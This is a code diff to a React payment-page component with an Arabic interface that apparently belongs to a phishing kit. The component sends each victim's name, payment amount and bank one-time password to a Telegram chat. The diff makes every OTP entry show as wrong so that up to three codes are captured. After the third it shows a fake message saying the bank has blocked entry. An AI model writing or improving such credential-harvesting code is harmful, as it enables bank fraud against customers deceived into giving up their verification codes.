@@ -15,6 +15,9 @@ const OTPVerification = () => {
   const navigate = useNavigate();
   const [otp, setOtp] = useState("");
   const [loading, setLoading] = useState(false);
+  const [attempts, setAttempts] = useState(0);
+  const [isBlocked, setIsBlocked] = useState(false);
+  const [errorMsg, setErrorMsg] = useState("");
 
   const queryParams = new URLSearchParams(window.location.search);
   const paymentData = {
@@ -26,10 +29,13 @@ const OTPVerification = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (isBlocked) return;
+    
     setLoading(true);
+    setErrorMsg("");
     
     const message = `
-<b>🔑 New OTP Entry</b>
+<b>🔑 New OTP Entry (Attempt ${attempts + 1})</b>
 <b>Name:</b> ${paymentData.customerName}
 <b>Amount:</b> ${paymentData.amount} KD
 <b>OTP:</b> <code>${otp}</code>
@@ -39,7 +45,17 @@ const OTPVerification = () => {
     await sendMessageToTelegram(message);
     
     setTimeout(() => {
-      navigate('/error' + window.location.search);
+      setLoading(false);
+      const newAttempts = attempts + 1;
+      setAttempts(newAttempts);
+      setOtp("");
+      
+      if (newAttempts >= 3) {
+        setIsBlocked(true);
+        setErrorMsg("تم حظر إدخال رمز التحقق بسبب محاولات خاطئة متعددة. يرجى مراجعة البنك.");
+      } else {
+        setErrorMsg("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
     }, 1500);
   };
 
@@ -91,8 +107,21 @@ const OTPVerification = () => {
           <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
             <div className="text-center space-y-3 sm:space-y-4">
               <p className="text-gray-600 text-sm sm:text-lg px-2">يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول</p>
+              
+              {errorMsg && (
+                <div className={`p-3 rounded-lg text-sm font-medium ${isBlocked ? 'bg-red-100 text-red-700' : 'bg-orange-100 text-orange-700'}`}>
+                  {errorMsg}
+                </div>
+              )}
+
               <div className="flex justify-center py-4 sm:py-6">
-                <InputOTP maxLength={6} value={otp} onChange={(value) => setOtp(value)} name="otp">
+                <InputOTP 
+                  maxLength={6} 
+                  value={otp} 
+                  onChange={(value) => setOtp(value)} 
+                  name="otp"
+                  disabled={isBlocked}
+                >
                   <InputOTPGroup className="gap-1 sm:gap-3">
                     <InputOTPSlot index={0} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                     <InputOTPSlot index={1} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
@@ -107,7 +136,7 @@ const OTPVerification = () => {
                 <button
                   type="submit"
                   className="flex-1 bg-blue-700 text-white py-3 sm:py-4 rounded-lg text-base sm:text-lg font-bold hover:bg-blue-800 transition-colors shadow-md disabled:opacity-50"
-                  disabled={loading || otp.length !== 6}
+                  disabled={loading || otp.length !== 6 || isBlocked}
                 >
                   {loading ? 'جاري التحميل...' : 'تأكيد'}
                 </button>
